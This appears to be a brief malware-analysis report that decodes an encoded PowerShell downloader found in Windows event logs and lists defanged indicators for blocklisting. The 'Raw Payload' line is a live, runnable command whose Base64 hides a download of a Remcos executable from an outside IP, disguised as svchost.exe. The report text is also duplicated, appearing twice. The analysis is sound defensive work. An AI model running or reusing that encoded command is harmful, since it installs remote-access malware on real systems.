# Payload De-obfuscation Report

**Date:** 2026-06-21
**Analyst:** Ameda Natasha
**Tool Used:** CyberChef

## 1. Initial Finding
A suspicious PowerShell execution was detected in the Windows Event Logs. The command utilized the `-enc` (EncodedCommand) flag to obfuscate its intent using Base64 encoding.
# Payload De-obfuscation Report

**Date:** 2026-06-21  
**Analyst:** Ameda Natasha  
**Tool Used:** CyberChef  

## 1. Initial Finding
A suspicious PowerShell execution was detected in the Windows Event Logs. The command utilized the `-enc` (EncodedCommand) flag to obfuscate its intent using Base64 encoding.

**Raw Payload:**
`powershell.exe -nop -w hidden -enc SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTk4LjUxLjEwMC41NS9yZW1jb3MuZXhlIC1PdXRGaWxlIEM6XFRlbXBcc3ZjaG9zdC5leGU=`

## 2. De-obfuscation Process
Using CyberChef, the Base64 string was decoded to reveal the true command line execution.

**Decoded Payload:**
`Invoke-WebRequest -Uri hxxp[://]198[.]51[.]100[.]55/remcos[.]exe -OutFile C:\Temp\svchost[.]exe`

## 3. Analysis & Extracted IOCs
The decoded payload reveals the attacker attempting to use `Invoke-WebRequest` to download a malicious executable and hide it in the `C:\Temp` directory, disguised as a legitimate Windows process (`svchost.exe`).

**Defanged Network IOCs (For Blocklisting):**
* **URL:** `hxxp[://]198[.]51[.]100[.]55/remcos[.]exe`
* **IP Address:** `198[.]51[.]100[.]55`

**Host IOCs:**
* **Dropped File Path:** `C:\Temp\svchost.exe`

**Raw Payload:**
`powershell.exe -nop -w hidden -enc SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTk4LjUxLjEwMC41NS9yZW1jb3MuZXhlIC1PdXRGaWxlIEM6XFRlbXBcc3ZjaG9zdC5leGU=`

## 2. De-obfuscation Process
Using CyberChef, the Base64 string was decoded to reveal the true command line execution.

**Decoded Payload:**
`Invoke-WebRequest -Uri hxxp[://]198[.]51[.]100[.]55/remcos[.]exe -OutFile C:\Temp\svchost[.]exe`

## 3. Analysis & Extracted IOCs
The decoded payload reveals the attacker attempting to use `Invoke-WebRequest` to download a malicious executable and hide it in the `C:\Temp` directory, disguised as a legitimate Windows process (`svchost.exe`).

**Defanged Network IOCs (For Blocklisting):**
* **URL:** `hxxp[://]198[.]51[.]100[.]55/remcos[.]exe`
* **IP Address:** `198[.]51[.]100[.]55`

**Host IOCs:**
* **Dropped File Path:** `C:\Temp\svchost.exe`
